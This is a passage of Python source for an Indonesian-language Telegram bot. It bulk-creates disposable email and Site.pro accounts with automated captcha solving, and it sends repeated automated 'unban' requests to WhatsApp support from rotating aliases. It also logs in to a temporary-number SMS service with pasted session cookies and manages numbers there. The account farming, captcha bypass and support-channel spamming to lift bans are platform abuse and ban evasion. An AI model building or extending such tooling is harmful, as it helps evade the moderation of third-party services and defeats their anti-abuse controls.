            matched_n = newest.get('matched_nomor')
            matched_line = (
                f"  {em(CE_NOMOR,'📞')} <b>Untuk nomor:</b> <code>+{matched_n}</code>\n"
                if matched_n else ""
            )
            body += (
                f"\n\n{em(CE_WHATSAPP,'❤️')} <b>Balasan dari WhatsApp Support</b>\n"
                f"  {em(CE_EMAIL,'📩')} <b>Dari:</b> "
                f"<code>support@support.whatsapp.com</code>\n"
                f"  {em(CE_FILE,'📁')} <b>Subject:</b> <i>{reply_subject}</i>\n"
                f"{matched_line}"
            )

        if result.get('error') and total_sent == 0:
            body += f"\n\n{em(E2,'❌')} <i>{result['error']}</i>"

        # Pilih title sesuai hasil: ada balasan = SUKSES, ada kirim = TERKIRIM, gagal
        if total_reply > 0:
            title = 'FIX WHATSAPP — BALASAN DITERIMA'
        elif total_sent > 0:
            title = 'FIX WHATSAPP — TERKIRIM'
        else:
            title = 'FIX WHATSAPP — GAGAL'

        try:
            await message.edit_text(
                _screen(title, body),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    finally:
        _sitepro_release(user_id)


# ════════════════════════════════════════════════════════════════
#  /create COMMAND — Bulk Create Site.pro Accounts
# ════════════════════════════════════════════════════════════════

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/create <jumlah> — buat akun cadangan untuk fitur fix."""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id

    if CAPTCHA_SOLVER != "browser" and not CAPTCHA_API_KEY:
        await update.message.reply_text(
            _screen('CREATE AKUN',
                    f"{em(E2,'❌')} <b>Konfigurasi captcha belum siap.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text(
            _screen('CREATE AKUN', (
                f"{em(CE_AKUN,'👤')} <b>Buat akun cadangan</b>\n\n"
                f"<b>Cara pakai:</b>\n"
                f"  <code>/create 5</code> — buat 5 akun\n"
                f"  <code>/create 10</code> — buat 10 akun\n"
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    count = int(context.args[0])
    is_owner_user = (user_id == USER_ID)
    max_create = 500 if is_owner_user else 5
    if count < 1 or count > max_create:
        limit_note = "" if is_owner_user else " (owner: unlimited)"
        await update.message.reply_text(
            _screen('CREATE AKUN',
                    f"{em(E2,'❌')} Jumlah harus 1-{max_create}{limit_note}"),
            parse_mode=ParseMode.HTML,
        )
        return

    context.user_data[f"create_count_{user_id}"] = count

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                "SELENIUM",
                callback_data=f"create_sel_{user_id}",
                icon_custom_emoji_id=E1,
                style="primary",
            ),
            InlineKeyboardButton(
                "API",
                callback_data=f"create_api_{user_id}",
                icon_custom_emoji_id=E1,
                style="success",
            ),
            InlineKeyboardButton(
                "BATAL",
                callback_data=f"create_cancel_{user_id}",
                icon_custom_emoji_id=E2,
                style="danger",
            ),
        ]
    ])
    await update.message.reply_text(
        _screen('CREATE AKUN', (
            f"{em(CE_AKUN,'👤')} <b>Akan membuat {count} akun.</b>\n\n"
            f"  • <b>SELENIUM</b> — Site.pro via browser (~60 detik/akun)\n"
            f"  • <b>API</b> — AtomicMail via HTTP (~10–30 detik/akun, perlu captcha key)\n"
            f"  • <b>BATAL</b> — batalkan."
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard,
    )


async def _process_create_background(count, user_id, message):
    """Background worker untuk bulk create accounts - PARALLEL (5 workers)."""
    can_start, limit_msg = _sitepro_can_start(user_id)
    if not can_start:
        try:
            await message.edit_text(
                _screen('CREATE AKUN', f"{em(E2,'❌')} {limit_msg}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    executor = None
    try:
        import traceback as _tb

        def run_one():
            # Jalan di thread worker. Batasi jumlah browser bersamaan via
            # semaphore (#2) + retry sampai 3x kalau gagal sementara (#1).
            with _SITEPRO_CREATE_SEM:
                last = {'success': False, 'error': 'unknown'}
                for _attempt in range(3):
                    try:
                        res = run_create_pipeline(
                            CAPTCHA_API_KEY, cur, conn, solver_type=CAPTCHA_SOLVER,
                        )
                    except Exception as e:
                        _tb.print_exc()
                        res = {'success': False, 'error': f'{type(e).__name__}: {e}'}
                    if res.get('success'):
                        return res
                    last = res
                    time.sleep(3)  # jeda sebelum retry
                return last

        loop = asyncio.get_running_loop()
        # Pakai pool GLOBAL: tugas /create dari user lain tidak akan saling
        # menunggu. Pool dishare oleh seluruh sitepro task. Concurrency riil
        # dibatasi _SITEPRO_CREATE_SEM di dalam run_one.
        aw = [loop.run_in_executor(_SITEPRO_GLOBAL_POOL, run_one) for _ in range(count)]

        success_count = 0
        fail_count = 0
        completed = 0
        errors = []

        for fut in asyncio.as_completed(aw):
            try:
                result = await fut
                ok = bool(result.get('success', False))
                err = result.get('error')
            except Exception as e:
                ok = False
                err = f'{type(e).__name__}: {e}'

            completed += 1
            if ok:
                success_count += 1
            else:
                fail_count += 1
                if err:
                    errors.append(str(err))

            progress = (
                f"{em(CE_LOADING,'🟠')} <b>Membuat akun {completed}/{count}...</b>\n"
                f"<i>(maks {SITEPRO_CREATE_MAX_PARALLEL} paralel)</i>\n\n"
                f"  {em(E1,'✅')} Berhasil: <b>{success_count}</b>\n"
                f"  {em(E2,'❌')} Gagal: <b>{fail_count}</b>"
            )
            try:
                await message.edit_text(
                    _screen('CREATE AKUN', progress),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

        summary = (
            f"{em(CE_AKUN,'👤')} <b>Selesai membuat {count} akun</b>\n\n"
            f"  {em(E1,'✅')} Berhasil: <b>{success_count}</b>\n"
            f"  {em(E2,'❌')} Gagal: <b>{fail_count}</b>"
        )
        if errors:
            # Kelompokkan error jadi kategori biar kelihatan bottleneck-nya (#6).
            cats = {}
            for e in errors:
                el = str(e).lower()
                if 'captcha' in el or 'recaptcha' in el:
                    key = 'Captcha'
                elif 'otp' in el or 'kode' in el:
                    key = 'OTP'
                elif 'mailbox' in el or 'sender' in el:
                    key = 'Mailbox'
                elif 'register' in el or 'daftar' in el or 'csrf' in el:
                    key = 'Register'
                elif 'email' in el or 'temp' in el:
                    key = 'Temp Email'
                elif 'db save' in el:
                    key = 'Simpan DB'
                else:
                    key = 'Lainnya'
                cats[key] = cats.get(key, 0) + 1
            lines = "\n".join(
                f"  • {k}: <b>{v}</b>"
                for k, v in sorted(cats.items(), key=lambda x: -x[1])
            )
            summary += f"\n\n<b>Penyebab gagal:</b>\n{lines}"
        try:
            await message.edit_text(
                _screen('CREATE AKUN — SELESAI', summary),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    except Exception as e:
        import traceback as _tb
        _tb.print_exc()
        try:
            await message.edit_text(
                _screen('CREATE AKUN',
                        f"{em(E2,'❌')} Error: {html.escape(str(e))}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        # Pool global tidak perlu di-shutdown di sini
        _sitepro_release(user_id)


# ════════════════════════════════════════════════════════════════
#  /create — API mode (AtomicMail)
# ════════════════════════════════════════════════════════════════
async def _process_create_api_background(count, user_id, message):
    """Background worker /create dengan jalur AtomicMail API.

    Untuk tiap akun:
      1. Sign-up AtomicMail.
      2. Kirim email permintaan unban ke support@support.whatsapp.com
         (nomor = placeholder; bisa diatur via /set nanti).
      3. Tunggu balasan (4 menit).
      4. Kalau gagal, buat alias baru & kirim ulang sampai 10 alias.

    Loop ulang sampai jumlah akun TER-VERIFIKASI (dapat balasan) == count.
    """
    can_start, limit_msg = _sitepro_can_start(user_id)
    if not can_start:
        try:
            await message.edit_text(
                _screen('CREATE AKUN · API', f"{em(E2,'❌')} {limit_msg}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    # Browser pipeline tidak butuh CAPTCHA_API_KEY (pakai NopeCHA via
    # DrissionPage seperti pipeline Site.pro).


    try:
        import functools
        from atomicmail_api import (
            AtomicMailClient, AtomicMailError, run_atomic_fix_pipeline_browser,
            DEFAULT_MAX_ALIAS_PER_ACCOUNT,
        )

        main_loop = asyncio.get_running_loop()

        # State agar progress bisa di-render dari thread worker
        state = {
            'created': 0,
            'replied': 0,
            'attempts': 0,
            'last_stage': 'starting',
            'last_msg': '',
        }

        def _render(title='CREATE AKUN · API'):
            return _screen(title, (
                f"{em(CE_LOADING,'🟠')} <b>{state['last_stage']}</b>\n\n"
                f"  {em(CE_AKUN,'👤')} Akun dibuat: <b>{state['created']}/{count}</b>\n"
                f"  {em(CE_WHATSAPP,'❤️')} Balasan WA: <b>{state['replied']}</b>\n"
                f"  {em(E6,'🚀')} Total percobaan: <b>{state['attempts']}</b>\n"
                + (f"\n<i>{html.escape(state['last_msg'])}</i>" if state['last_msg'] else "")
            ))

        async def _safe_edit(title='CREATE AKUN · API'):
            try:
                await message.edit_text(_render(title), parse_mode=ParseMode.HTML)
            except Exception:
                pass

        def _push_render(title='CREATE AKUN · API'):
            try:
                asyncio.run_coroutine_threadsafe(_safe_edit(title), main_loop)
            except Exception:
                pass

        def _progress_cb(stage, data):
            state['last_stage'] = stage
            if stage == 'signup_start':
                state['last_msg'] = 'Daftar akun AtomicMail baru...'
            elif stage == 'signup_ok':
                state['created'] += 1
                state['last_msg'] = f"Akun: {data.get('address','')}"
            elif stage == 'send_start':
                state['attempts'] += 1
                state['last_msg'] = (
                    f"Kirim ke WA support dari {data.get('from','?')} "
                    f"(percobaan {data.get('try','?')})"
                )
            elif stage == 'send_ok':
                state['last_msg'] = f"Terkirim id={data.get('resp',{}).get('id','?')}"
            elif stage == 'send_err':
                state['last_msg'] = f"❌ Send error: {data.get('err','')[:120]}"
            elif stage == 'wait_reply':
                state['last_msg'] = "Menunggu balasan dari support@support.whatsapp.com..."
            elif stage == 'reply':
                state['replied'] += 1
                subj = ((data.get('msg') or {}).get('subject') or '')[:80]
                state['last_msg'] = f"✅ Balasan diterima: {subj}"
            elif stage == 'alias_new':
                state['last_msg'] = (
                    f"Buat alias baru: {data.get('alias','?')} "
                    f"({data.get('used','?')}/{data.get('limit','?')})"
                )
            elif stage == 'alias_limit':
                state['last_msg'] = (
                    f"Alias habis ({data.get('used','?')}/{data.get('limit','?')}), "
                    f"akun ini dihentikan."
                )
            elif stage == 'alias_err':
                state['last_msg'] = f"❌ Alias error: {data.get('err','')[:120]}"
            _push_render()

        await _safe_edit('CREATE AKUN · API')

        # Ambil 1 nomor target dari favorit user atau placeholder.
        # Untuk awalan, pakai placeholder netral (akan diganti template setelah
        # user terhubung lewat /set). Kalau user punya template fix bahasa-default
        # yang berisi nomor, kita coba ekstrak. Default: 6285757411154.
        target_phone = "6285757411154"

        loop = asyncio.get_running_loop()

        # Callback simpan token akun ke DB (login lewat token nanti).
        def _save_account(info):
            try:
                cur.execute(
                    "INSERT INTO atomicmail_accounts "
                    "(user_id, address, username, atomic_user_id, access_token, session_id, status) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'active')",
                    (user_id, info.get('address'), info.get('username'),
                     info.get('user_id'), info.get('access_token'),
                     info.get('session_id')),
                )
                conn.commit()
            except Exception as _e:
                print(f"[ATOMIC] save account err: {_e}")

        # Loop sampai dapat `count` akun terverifikasi (yang dapet balasan WA).
        verified = 0
        rounds = 0
        max_rounds = max(count * 3, 10)  # safety cap

        results_all = []

        while verified < count and rounds < max_rounds:
            rounds += 1
            try:
                res = await loop.run_in_executor(
                    None,
                    functools.partial(
                        run_atomic_fix_pipeline_browser,
                        [target_phone],
                        reply_timeout=240,
                        max_alias_per_account=DEFAULT_MAX_ALIAS_PER_ACCOUNT,
                        progress_cb=_progress_cb,
                        headless=False,
                    ),
                )
            except Exception as e:
                state['last_msg'] = f"Pipeline error: {e}"
                _push_render()
                continue

            # Simpan token akun hasil signup browser ke DB.
            try:
                acc = res.get('account') or {}
                if acc.get('access_token') and acc.get('address'):
                    _save_account({
                        'address': acc.get('address'),
                        'username': (acc.get('address') or '').split('@')[0],
                        'user_id': acc.get('user_id'),
                        'access_token': acc.get('access_token'),
                        'session_id': acc.get('session_id'),
                    })
            except Exception:
                pass

            results_all.append(res)
            if (res.get('success_count') or 0) > 0:
                verified += 1

        # Final summary
        try:
            await message.edit_text(
                _screen('CREATE AKUN · API — SELESAI', (
                    f"{em(CE_AKUN,'👤')} <b>Selesai mode API.</b>\n\n"
                    f"  Akun dibuat: <b>{state['created']}</b>\n"
                    f"  Balasan WA: <b>{state['replied']}/{count}</b>\n"
                    f"  Total round: <b>{rounds}</b>"
                )),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    except Exception as e:
        import traceback as _tb
        _tb.print_exc()
        try:
            await message.edit_text(
                _screen('CREATE AKUN · API',
                        f"{em(E2,'❌')} Error: {html.escape(str(e))}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        _sitepro_release(user_id)


HELP_TEXT = """
{header}
<b>Perintah Utama</b>
  /start \u2014 Menu utama + dashboard
  /cookies \u2014 Login via cookies iVASMS
  /help \u2014 Panduan lengkap
  /live [filter] \u2014 SMS terbaru
  /notif \u2014 Toggle monitor SMS
  /line \u2014 Line extractor file .txt
  /fix &lt;nomor&gt; \u2014 Kirim WA unban request
  /create &lt;jumlah&gt; \u2014 Bulk buat akun cadangan

<b>Menu (setelah login)</b>
  {em1} <b>SMS &amp; NOTIF</b> \u2014 Live, Monitor, SMS Aktif, Riwayat
  {em2} <b>NOMOR</b> \u2014 Add range, Favorit, Export, Bulk
  {em3} <b>DATA</b> \u2014 All platform, Negara aktif
  {em4} <b>AKUN &amp; TOOLS</b> \u2014 Multi-akun, Logout, Bantuan

<b>Tips Login Cookies (Android)</b>
  1. Buka ivas.tempnum.qzz.io di Chrome Android
  2. Login akun iVASMS
  3. Copy cookies (via extensi atau devtools remote)
  4. Kirim: <code>/cookies &lt;isi cookie&gt;</code>

<b>Owner</b>
  /adduser /listuser /deluser /stats /bc /mt

{footer}"""


async def fav_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fav [range] — simpan atau tampilkan favorit range."""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    if not context.args:
        favs = get_favorite_ranges(user_id, limit=10)
        if not favs:
            await update.message.reply_text(
                _screen('FAVORIT RANGE', "Belum ada favorit.\n\nTambah: <code>/fav NAMA_RANGE</code>", ''),
                parse_mode=ParseMode.HTML,
                reply_markup=get_sub_nomor_keyboard(user_id),
            )
            return
        lines = "\n".join(f"  • <code>{html.escape(f)}</code>" for f in favs)
        await update.message.reply_text(
            _screen('FAVORIT RANGE', lines, ''),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_nomor_keyboard(user_id),
        )
        return
    range_name = " ".join(context.args).strip()
    if add_favorite_range(user_id, range_name):
        await update.message.reply_text(
            _build(TEMPLATE_SUCCESS, 'FAVORIT DISIMPAN', message=f"Range <code>{html.escape(range_name)}</code> ditambahkan ke favorit."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_nomor_keyboard(user_id),
        )
    else:
        await update.message.reply_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message="Gagal menyimpan favorit."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id),
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    text = HELP_TEXT.format(
        header=_header('BANTUAN · PANDUAN BOT'),
        footer=_footer(),
        em1=em(CE_MONITOR, '📡'), em2=em(CE_NOMOR, '📞'),
        em3=em(CE_NEGARA, '🌍'), em4=em(CE_AKUN, '👤'),
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")
    ]])
    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


async def show_sms_history(update, context, user_id, page=0):
    """Riwayat SMS dengan pagination."""
    query = update.callback_query
    per_page = 5
    if not check_user_login(user_id):
        await query.answer("Belum login!", show_alert=True)
        return
    _, _, _, _, cookies_dict, csrf, _ = get_user_session(user_id)
    msg = await query.edit_message_text(
        f"{em(CE_LOADING,'🟠')} <i>Memuat riwayat SMS...</i>",
        parse_mode=ParseMode.HTML,
    )
    session = requests.Session()
    for k, v in (cookies_dict or {}).items():
        session.cookies.set(k, v)
    data = await bg.run(user_id, fetch_live_sms, session, csrf, "", 50)
    items = (data or {}).get('data', []) if data else []
    total = len(items)
    if not items:
        await msg.edit_text(
            _screen('RIWAYAT SMS', f"  {em(E2,'📭')} Belum ada SMS hari ini.", 'Menu › SMS › Riwayat'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_sms_keyboard(user_id),
        )
        return
    start = page * per_page
    chunk = items[start:start + per_page]
    lines = [f"  {em(E1,'📩')} Total: <code>{total}</code> SMS\n  {'─'*28}\n"]
    for i, item in enumerate(chunk, start + 1):
        rng = item.get('range', '?')
        term = item.get('termination', {})
        num = extract_number_from_html(term.get('test_number', ''))
        t = item.get('senttime', '–')
        lines.append(f"  <b>{i}.</b> <code>{rng}</code>\n      📱 +{num or '?'} │ 🕒 {t}\n")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"sms_hist_{user_id}_{page-1}", style="primary"))
    nav.append(InlineKeyboardButton(f"{page+1}/{(total-1)//per_page+1}", callback_data="noop", style="primary"))
    if start + per_page < total:
        nav.append(InlineKeyboardButton("▶️", callback_data=f"sms_hist_{user_id}_{page+1}", style="primary"))
    kb = [nav, [InlineKeyboardButton("REFRESH", callback_data=f"sms_hist_{user_id}_0", style="success")],
          [InlineKeyboardButton("KEMBALI", callback_data=f"sub_sms_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")]]
    await msg.edit_text(
        _screen('RIWAYAT SMS', "\n".join(lines), 'Menu › SMS › Riwayat'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /start

    Catatan: /start TIDAK lagi membutuhkan /adduser. User bukan-allowed tetap
    boleh masuk; mereka hanya melihat tombol publik (LOGIN COOKIES, FIX MERAH,
    LINE EXTRACTOR, BANTUAN). Akses ke fitur iVASMS akan ditolak natural di
    handler masing-masing.
    """
    if not update.effective_user:
        return
    
    user_id = update.effective_user.id  
    first_name = update.effective_user.first_name or "User"
    
    update_user_username(update.effective_user)
    debug_database(user_id)
    
    if update.callback_query and not update.callback_query.message:
        return

    loading_msg = None
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                f"{em(CE_LOADING,'🟠')} <i>Memuat dashboard...</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    elif update.message:
        loading_msg = await update.message.reply_text(
            f"{em(CE_LOADING,'🟠')} <i>Memuat dashboard...</i>",
            parse_mode=ParseMode.HTML,
        )

    text = await build_home_text(user_id, first_name, context)
    reply_markup = get_main_keyboard(user_id, check_user_login(user_id))
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    elif loading_msg:
        await loading_msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )


async def cookies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /cookies"""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    
    if not context.args and not update.message.reply_to_message:
        await update.message.reply_text(
            _build(TEMPLATE_COOKIES, 'LOGIN · COOKIES'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    if update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""
    else:
        text = " ".join(context.args)
    
    print(f"[DEBUG] User {user_id} mengirim cookies: {text[:100]}...")
    
    is_valid, error_msg = validate_cookies_text(text)
    if not is_valid:
        await update.message.reply_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message=f"  {em(E2,'⭐')} {error_msg}"),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    cookies_dict = extract_cookies_from_text(text)
    
    if not cookies_dict:
        await update.message.reply_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message=f"  {em(E2,'⭐')} Format cookies tidak valid!"),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    print(f"[DEBUG] Cookies berhasil diekstrak: {list(cookies_dict.keys())}")
    
    msg = await update.message.reply_text(
        f"{em(CE_LOADING,'🟠')} <i>Memverifikasi cookies...</i>",
        parse_mode=ParseMode.HTML
    )
    
    
    session, csrf, profile, error_code = await bg.run(user_id, login_with_cookies, cookies_dict)
    
    
    
    if error_code == 'invalid':
        await msg.edit_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message="Cookies tidak valid atau sudah expired!\n\nSilahkan login ulang di iVASMS dan copy cookies baru."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    if error_code == 'timeout':
        await msg.edit_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message="Koneksi ke iVASMS timeout!\n\nCoba lagi beberapa saat."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    if error_code in ['server_error', 'forbidden', 'exception'] or (session and not profile):
        
        
        
        print(f"[DEBUG] Error '{error_code}' tapi cookies mungkin valid - minta email manual")
        
        
        context.user_data[f'pending_cookies_{user_id}'] = {
            'cookies_dict': cookies_dict,
            'session_cookies': session.cookies.get_dict() if session else cookies_dict,
            'csrf': csrf,
            'error_code': error_code
        }
        
        error_reason = {
            'server_error': 'Server iVASMS sedang error (500)',
            'forbidden': 'Server mengembalikan 403 Forbidden',
            'exception': 'Terjadi error koneksi'
        }.get(error_code, 'Profil tidak bisa diambil otomatis')
        
        await msg.edit_text(
            f"{em(E2, '⭐')} <b>COOKIES TERDETEKSI TAPI PROFIL GAGAL DIAMBIL</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Alasan: {error_reason}\n"
            f" Cookies: {'Valid' if session else 'Tidak pasti'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f" <b>Masukkan email akun iVASMS kamu secara manual:</b>\n\n"
            f"Contoh: user@gmail.com\n\n"
            f"<i>Ketik email kamu sekarang...</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
        
        
        context.user_data[f'waiting_email_{user_id}'] = True
        return
    
    
    if error_code == 'ok' and session:
        await _save_and_confirm_login(msg, user_id, session, csrf, profile, context, update)
        return
    
    
    await msg.edit_text(
        _build(TEMPLATE_ERROR, 'GAGAL', message="Terjadi kesalahan tidak diketahui. Coba lagi."),
        parse_mode=ParseMode.HTML,
        reply_markup=get_back_keyboard(user_id)
    )

async def _save_and_confirm_login(msg, user_id, session, csrf, profile, context, update=None):
    """Simpan session dan kirim konfirmasi login berhasil"""
    
    email = profile.get('email') if profile else None
    
    if not email:
        
        try:
            profile_resp = session.get(PROFILE_URL, timeout=12)
            if profile_resp.status_code == 200:
                temp_profile = extract_profile_from_html(profile_resp.text)
                email = temp_profile.get('email')
                if email and profile:
                    profile['email'] = email
        except:
            pass
    
    if not email:
        email = f"user_{user_id}@cookies.login"
        print(f"[DEBUG] Menggunakan email fallback: {email}")
    
    
    save_result, saved_email = save_cookies_session(user_id, email, session, csrf, profile)
    
    
    db_email, db_name, db_country, db_phone, _, _, logged_in = get_user_session(user_id)
    
    
    profile_text = ""
    if db_name:
        profile_text += f"\n{EMOJI['NAME']}: {db_name}"
    if db_email and not db_email.endswith('@cookies.login'):
        profile_text += f"\n{EMOJI['MAIL']}: {db_email}"
    if db_country:
        profile_text += f"\n{EMOJI['COUNTRY']}: {db_country}"
    if db_phone:
        profile_text += f"\n{EMOJI['PHONE']}: {db_phone}"
    
    if not profile_text:
        profile_text = "\n Login berhasil (profil tidak lengkap)"
    
    await msg.edit_text(
        _build(TEMPLATE_SUCCESS, 'SUKSES', 
            message=f"{em(E1, '⭐')} <b>LOGIN BERHASIL</b>{profile_text}\n\n Cookies tersimpan"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ]])
    )
    
    
    if update and update.message and update.message.reply_to_message:
        try:
            await update.message.reply_to_message.delete()
        except:
            pass

async def bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /bulk - Hapus semua nomor"""
    if not is_allowed_user(update.effective_user.id):
        return
    user_id = update.effective_user.id
    
    if user_id in active_bulk_locks:
        await update.message.reply_text("⚠️ Hapus semua sedang berjalan, mohon tunggu...")
        return
    
    if not check_user_login(user_id):
        await update.message.reply_text(
            _build(TEMPLATE_ERROR, 'GAGAL', message="Kamu belum login! Gunakan /cookies dulu."),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    
    email, _, _, _, _, _, _ = get_user_session(user_id)
    
    text = f""" <b>HAPUS SEMUA NOMOR</b> 

{EMOJI['LINE']}
{EMOJI['USER']} User ID: {user_id}
{EMOJI['MAIL']} Email: {email}

{em(E2, '⭐')} <b>PERINGATAN!</b>
Tindakan ini akan menghapus SEMUA nomor
yang ada di akun iVASMS kamu.

{EMOJI['LINE']}
Yakin ingin melanjutkan?
{EMOJI['LINE']}"""
    
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(" YA, HAPUS SEMUA", callback_data=f"bulk_confirm_{user_id}", style="danger"),
                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="success")
            ]
        ])
    )

async def bulk_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback konfirmasi hapus semua nomor"""
    query = update.callback_query
    user_id = update.effective_user.id
    
    if user_id in active_bulk_locks:
        await query.answer("⚠️ Hapus semua sedang berjalan, mohon tunggu...")
        return
        
    await query.answer()
    active_bulk_locks.add(user_id)
    
    try:
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        
        if not logged_in or not cookies_dict or not csrf:
            await query.edit_message_text(
                f"{em(E2, '⭐')} <b>SESSION EXPIRED</b>\n\nSilahkan login ulang dengan /cookies",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)
        
        await query.edit_message_text(
            f"{em(CE_HAPUS,'🗑')} <b>Sedang menghapus semua nomor...</b>\n{em(CE_LOADING,'🟠')} Mohon tunggu, ini mungkin memerlukan waktu.",
            parse_mode=ParseMode.HTML
        )
        
        success, message = await bg.run(user_id, bulk_return_numbers, session, csrf)
        
        if success:
            safe_msg = html.escape(str(message))
            await query.edit_message_text(
                f"{em(E1, '⭐')} <b>BERHASIL!</b>\n\n{EMOJI['LINE']}\n{safe_msg}\n{EMOJI['LINE']}\n\nSemua nomor telah dihapus dari akun Anda.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
        else:
            if "419" in str(message) or "CSRF" in str(message):
                await query.edit_message_text(
                    "🔄 <i>CSRF Token mismatch, mencoba refresh...</i>",
                    parse_mode=ParseMode.HTML
                )
                
                new_csrf = await bg.run(user_id, refresh_csrf_token, session)
                
                if new_csrf:
                    success2, message2 = await bg.run(user_id, bulk_return_numbers, session, new_csrf)
                    
                    if success2:
                        safe_msg2 = html.escape(str(message2))
                        await query.edit_message_text(
                            f"{em(E1, '⭐')} <b>BERHASIL!</b>\n\n{EMOJI['LINE']}\n{safe_msg2}\n{EMOJI['LINE']}\n\nSemua nomor telah dihapus.",
                            parse_mode=ParseMode.HTML,
                            reply_markup=InlineKeyboardMarkup([[
                                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                            ]])
                        )
                        return
                
                safe_msg = html.escape(str(message))
                await query.edit_message_text(
                    f"{em(E2, '⭐')} <b>GAGAL MENGHAPUS</b>\n\n{EMOJI['LINE']}\n{safe_msg}\n{EMOJI['LINE']}\n\n💡 Silahkan coba lagi atau login ulang dengan /cookies",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
            else:
                safe_msg = html.escape(str(message))
                await query.edit_message_text(
                    f"{em(E2, '⭐')} <b>GAGAL MENGHAPUS</b>\n\n{EMOJI['LINE']}\n{safe_msg}\n{EMOJI['LINE']}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                
    except Exception as e:
        logger.error(f"Error bulk_confirm: {e}")
        await query.edit_message_text(
            f"{em(E2, '⭐')} <b>ERROR</b>\n\n{html.escape(str(e)[:100])}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
    finally:
        active_bulk_locks.discard(user_id)

def refresh_csrf_token(session):
    """Refresh CSRF token dari halaman"""
    try:
